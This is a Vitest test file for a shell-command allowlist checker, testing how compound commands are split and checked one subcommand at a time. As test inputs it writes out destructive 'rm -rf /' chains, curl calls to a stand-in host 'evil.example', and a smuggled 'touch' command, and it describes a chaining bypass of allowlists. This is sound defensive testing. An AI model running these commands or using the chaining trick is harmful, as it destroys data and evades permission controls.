import { describe, it, expect } from 'vitest'
import { splitCompoundCommand } from '../../../src/engine/security/rules.js'
import { checkShellCommand } from '../../../src/engine/security/shell.js'
import type { ShellSecurityConfig } from '../../../src/engine/security/config.js'

// Real, previously-open gap: checkShellCommand's allowlist matching
// (matchShellPattern) fully regex-matches a wildcard pattern against the
// WHOLE command string ('git *' -> /^git .*$/), and '.*' matches shell
// metacharacters (&&, ||, ;, |) the same as any other character. A
// statically-authored, non-interpolated `@query "git status && rm -rf /"`
// matched 'git *' as one string and reached a real shell with shell:true.
// tests/unit/engine/shell-command-chaining.test.ts's B1 fix closed the
// INTERPOLATION-based route (a value substituted into command=), but a
// literal chain written directly in the .stage source was never
// interpolated at all, so that fix never touched this path. Claude Code's
// own permission matcher checks each subcommand of a chain independently;
// this closes the same hole in checkShellCommand itself so every existing
// call site benefits with no call-site changes.
describe('splitCompoundCommand', () => {
  it('splits on &&, ||, ;, and a single |', () => {
    expect(splitCompoundCommand('git status && rm -rf /')).toEqual(['git status', 'rm -rf /'])
    expect(splitCompoundCommand('a || b')).toEqual(['a', 'b'])
    expect(splitCompoundCommand('a ; b')).toEqual(['a', 'b'])
    expect(splitCompoundCommand('a | b')).toEqual(['a', 'b'])
  })

  it('does not split on || as two separate |, or on a quoted operator character', () => {
    expect(splitCompoundCommand('a || b')).toHaveLength(2) // not 4
    expect(splitCompoundCommand('echo "a; b"')).toEqual(['echo "a; b"'])
    expect(splitCompoundCommand("echo 'a && b'")).toEqual(["echo 'a && b'"])
  })

  it('a single command with no operators is returned as one element', () => {
    expect(splitCompoundCommand('git status --short')).toEqual(['git status --short'])
  })

  // The exact case that broke on the first version of this fix: shellQuote()
  // escapes an embedded single quote as close-backslash-quote-reopen
  // ('it's -> 'it'\''s), which is one literal quote character logically
  // still inside the original span, not two independent quote regions with
  // an unquoted gap between them.
  it('treats shellQuote()\'s embedded-quote escape as staying inside the quoted span', () => {
    const shellQuoted = `'it'\\''s fine; touch MARKER.txt'` // shellQuote("it's fine; touch MARKER.txt")
    expect(splitCompoundCommand(`echo ${shellQuoted}`)).toEqual([`echo ${shellQuoted}`])
  })

  it('a backslash-escaped operator outside quotes is literal, not a chain boundary', () => {
    expect(splitCompoundCommand('find . -name foo \\; -print')).toEqual(['find . -name foo \\; -print'])
  })
})

describe('checkShellCommand: compound commands checked per subcommand', () => {
  const allowGit: ShellSecurityConfig = {
    enabled: true, allow_patterns: ['git *'], deny_patterns: [], allow_network: false, require_confirmation: false, audit_log: false,
  }

  it('a literal, statically-authored chain no longer rides an allowed prefix past the check', () => {
    const result = checkShellCommand('git status && rm -rf /tmp/whatever', allowGit)
    expect(result.allowed).toBe(false)
    // Caught by the immutable always_block tier for 'rm -rf *', evaluated
    // independently against the second subcommand.
    expect(result.tier).toBe('always_block')
  })

  it('every subcommand must independently be in the allowlist, not just the first', () => {
    const result = checkShellCommand('git status && curl https://evil.example/x', allowGit)
    expect(result.allowed).toBe(false)
    expect(result.tier).toBe('not_allowed')
  })

  it('a chain where every subcommand is independently allowed is allowed', () => {
    const cfg: ShellSecurityConfig = { ...allowGit, allow_patterns: ['git *', 'echo *'] }
    const result = checkShellCommand('git status && echo done', cfg)
    expect(result.allowed).toBe(true)
  })

  it('a single command with no chain operators behaves exactly as before (no regression)', () => {
    expect(checkShellCommand('git status --short', allowGit).allowed).toBe(true)
    expect(checkShellCommand('curl https://evil.example', allowGit).allowed).toBe(false)
  })

  it('a piped chain is also checked per stage', () => {
    const cfg: ShellSecurityConfig = { ...allowGit, allow_patterns: ['git log*', 'grep *'] }
    expect(checkShellCommand('git log | grep fix', cfg).allowed).toBe(true)
    expect(checkShellCommand('git log | rm -rf /', cfg).allowed).toBe(false)
  })
})
